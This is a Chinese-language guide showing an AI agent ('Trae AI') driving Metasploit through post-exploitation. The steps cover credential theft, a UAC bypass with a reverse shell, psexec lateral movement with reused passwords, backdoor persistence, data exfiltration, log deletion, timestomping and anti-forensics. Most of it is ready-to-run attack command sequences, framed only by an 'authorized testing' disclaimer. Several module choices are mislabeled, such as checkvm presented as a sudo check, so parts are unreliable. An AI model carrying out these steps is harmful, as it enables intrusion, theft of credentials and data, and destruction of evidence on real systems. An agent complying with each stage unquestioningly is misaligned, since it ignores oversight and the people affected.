# 後滲透範例 - Trae AI + Metasploit MCP

本文檔展示如何透過 Trae AI 使用 Metasploit 的 post 模組進行後滲透活動和系統信息收集。

⚠️ **重要提醒：所有操作僅限於授權的滲透測試環境中使用**

## 前置條件

- 已獲得目標系統的 Meterpreter session
- 確保 session 處於活躍狀態
- 根據目標系統選擇適當的 post 模組

## Windows 系統後滲透

### 1. 系統信息收集

**用戶提問：**
```
收集 Windows 目標系統的詳細信息
```

**Trae AI 操作流程：**
```
# 進入 Meterpreter session
sessions -i 1

# 基本系統信息
sysinfo
getuid

# 使用 post 模組收集詳細信息
background
use post/windows/gather/enum_system
set SESSION 1
run
```

**預期結果：**
- 操作系統版本和架構
- 系統補丁級別
- 硬件配置信息
- 網絡配置詳情
- 安裝的軟件列表

### 2. 用戶和權限枚舉

**用戶提問：**
```
枚舉目標系統的用戶賬戶和權限信息
```

**Trae AI 操作流程：**
```
# 枚舉本地用戶
use post/windows/gather/enum_users
set SESSION 1
run

# 枚舉域用戶（如果在域環境中）
use post/windows/gather/enum_domain_users
set SESSION 1
run

# 檢查當前用戶權限
use post/windows/gather/win_privs
set SESSION 1
run
```

### 3. 網絡信息收集

**用戶提問：**
```
收集目標系統的網絡配置和連接信息
```

**Trae AI 操作流程：**
```
# 網絡配置枚舉
use post/windows/gather/enum_network
set SESSION 1
run

# ARP 表信息
use post/windows/gather/arp_scanner
set SESSION 1
run

# 路由表信息
use post/windows/gather/enum_routes
set SESSION 1
run
```

### 4. 憑據收集

**用戶提問：**
```
從目標系統中提取存儲的憑據
```

**Trae AI 操作流程：**
```
# 嘗試提取 Windows 憑據
use post/windows/gather/credentials/windows_autologin
set SESSION 1
run

# 提取瀏覽器保存的密碼
use post/windows/gather/enum_chrome
set SESSION 1
run

# 提取 WiFi 密碼
use post/windows/gather/enum_wlan_profiles
set SESSION 1
run
```

### 5. 註冊表分析

**用戶提問：**
```
分析 Windows 註冊表中的敏感信息
```

**Trae AI 操作流程：**
```
# 枚舉已安裝的應用程序
use post/windows/gather/enum_applications
set SESSION 1
run

# 檢查自啟動項
use post/windows/gather/enum_startup_programs
set SESSION 1
run

# 枚舉服務
use post/windows/gather/enum_services
set SESSION 1
run
```

## Linux 系統後滲透

### 6. Linux 系統信息收集

**用戶提問：**
```
收集 Linux 目標系統的詳細信息
```

**Trae AI 操作流程：**
```
# Linux 系統枚舉
use post/linux/gather/enum_system
set SESSION 1
run

# 檢查系統配置
use post/linux/gather/enum_configs
set SESSION 1
run

# 枚舉網絡信息
use post/linux/gather/enum_network
set SESSION 1
run
```

### 7. Linux 用戶和權限

**用戶提問：**
```
枚舉 Linux 系統的用戶和權限信息
```

**Trae AI 操作流程：**
```
# 枚舉用戶賬戶
use post/linux/gather/enum_users_history
set SESSION 1
run

# 檢查 sudo 權限
use post/linux/gather/checkvm
set SESSION 1
run

# 枚舉 cron 任務
use post/linux/gather/enum_cron
set SESSION 1
run
```

### 8. Linux 憑據收集

**用戶提問：**
```
從 Linux 系統中收集憑據信息
```

**Trae AI 操作流程：**
```
# 收集 SSH 密鑰
use post/linux/gather/enum_users_history
set SESSION 1
run

# 檢查歷史命令
use post/linux/gather/enum_commands
set SESSION 1
run

# 枚舉環境變量
use post/linux/gather/enum_environment
set SESSION 1
run
```

## 權限提升

### 9. Windows 權限提升

**用戶提問：**
```
嘗試在 Windows 系統上提升權限
```

**Trae AI 操作流程：**
```
# 檢查權限提升機會
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# 嘗試 UAC 繞過
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4445
run
```

### 10. Linux 權限提升

**用戶提問：**
```
在 Linux 系統上尋找權限提升途徑
```

**Trae AI 操作流程：**
```
# 本地漏洞建議器
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# 檢查 SUID 文件
use post/linux/gather/enum_system
set SESSION 1
run
```

## 橫向移動

### 11. 網絡發現和橫向移動

**用戶提問：**
```
發現內網中的其他系統並嘗試橫向移動
```

**Trae AI 操作流程：**
```
# 內網掃描
use post/multi/gather/ping_sweep
set SESSION 1
set RHOSTS 192.168.1.0/24
run

# 端口掃描
use post/windows/gather/arp_scanner
set SESSION 1
run

# SMB 共享枚舉
use post/windows/gather/enum_shares
set SESSION 1
run
```

### 12. 憑據重用攻擊

**用戶提問：**
```
使用獲得的憑據攻擊其他系統
```

**Trae AI 操作流程：**
```
# 使用 PSExec 橫向移動
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.51
set SMBUser administrator
set SMBPass password123
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

## 持久化

### 13. Windows 持久化

**用戶提問：**
```
在 Windows 系統上建立持久化訪問
```

**Trae AI 操作流程：**
```
# 創建服務持久化
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /root/backdoor.exe
set STARTUP SERVICE
run

# 註冊表持久化
use post/windows/manage/persistence
set SESSION 1
set DELAY 10
run
```

### 14. Linux 持久化

**用戶提問：**
```
在 Linux 系統上建立持久化機制
```

**Trae AI 操作流程：**
```
# Cron 任務持久化
use post/linux/manage/cron_persistence
set SESSION 1
set COMMAND "/tmp/backdoor"
set TIMING "@reboot"
run

# SSH 密鑰持久化
use post/linux/manage/sshkey_persistence
set SESSION 1
run
```

## 數據收集和滲出

### 15. 敏感文件搜索

**用戶提問：**
```
搜索目標系統中的敏感文件
```

**Trae AI 操作流程：**
```
# 搜索敏感文件
use post/windows/gather/enum_files
set SESSION 1
set SEARCH_FROM C:\\
set FILE_GLOBS *.txt,*.doc,*.pdf,*.xls
run

# 搜索包含密碼的文件
use post/multi/gather/find_files
set SESSION 1
set PATTERN password
run
```

### 16. 數據打包和下載

**用戶提問：**
```
將收集的數據打包並下載
```

**Trae AI 操作流程：**
```
# 進入 Meterpreter session
sessions -i 1

# 創建壓縮包
zip -r /tmp/collected_data.zip /path/to/sensitive/files

# 下載到本地
download /tmp/collected_data.zip /root/evidence/
```

## 痕跡清理

### 17. 日誌清理

**用戶提問：**
```
清理攻擊痕跡和日誌記錄
```

**Trae AI 操作流程：**
```
# Windows 事件日誌清理
use post/windows/manage/delete_logs
set SESSION 1
run

# 清理命令歷史
use post/windows/manage/priv_migrate
set SESSION 1
run
```

### 18. 時間戳修改

**用戶提問：**
```
修改文件時間戳以隱藏活動痕跡
```

**Trae AI 操作流程：**
```
# 修改文件時間戳
use post/windows/manage/timestomp
set SESSION 1
set TARGET_FILE C:\\temp\\backdoor.exe
set BLANK true
run
```

## 報告和文檔

### 19. 自動化報告生成

**用戶提問：**
```
生成後滲透活動的詳細報告
```

**Trae AI 建議的報告內容：**
1. **執行摘要**：攻擊路徑和關鍵發現
2. **系統信息**：目標系統的詳細配置
3. **發現的漏洞**：安全弱點和配置問題
4. **獲得的訪問權限**：權限級別和訪問範圍
5. **敏感數據**：發現的敏感信息類型
6. **修復建議**：具體的安全改進措施

### 20. 證據保全

**用戶提問：**
```
如何正確保存和管理收集的證據？
```

**Trae AI 建議的最佳實踐：**
```
# 創建證據目錄結構
mkdir -p /evidence/{screenshots,files,logs,reports}

# 生成哈希值驗證完整性
sha256sum collected_data.zip > collected_data.zip.sha256

# 加密敏感數據
gpg --cipher-algo AES256 --compress-algo 1 --symmetric collected_data.zip
```

## 高級技巧

### 21. 內存分析

**用戶提問：**
```
從目標系統內存中提取敏感信息
```

**Trae AI 操作流程：**
```
# 內存轉儲
use post/windows/gather/memory_grep
set SESSION 1
set PATTERN "password"
run

# 進程內存分析
use post/windows/gather/enum_processes
set SESSION 1
run
```

### 22. 反取證技術

**用戶提問：**
```
如何避免被數字取證工具檢測？
```

**Trae AI 建議的技術：**
1. **內存駐留**：避免在磁盤上留下文件
2. **加密通信**：使用 HTTPS payload
3. **時間混淆**：隨機化活動時間
4. **進程注入**：隱藏在合法進程中
5. **日誌規避**：避免觸發安全事件

## 故障排除

### 23. Session 管理問題

**用戶提問：**
```
Meterpreter session 經常斷開，如何保持穩定連接？
```

**Trae AI 解決方案：**
```
# 遷移到穩定進程
migrate -N explorer.exe

# 設置自動重連
set AutoRunScript multi_console_command -r /root/reconnect.rc

# 使用 HTTPS payload 提高穩定性
set PAYLOAD windows/meterpreter/reverse_https
```

---

**重要提醒：**
- 所有後滲透活動必須在授權範圍內進行
- 及時清理測試痕跡，避免影響生產環境
- 妥善保管收集的敏感信息
- 遵循負責任的漏洞披露原則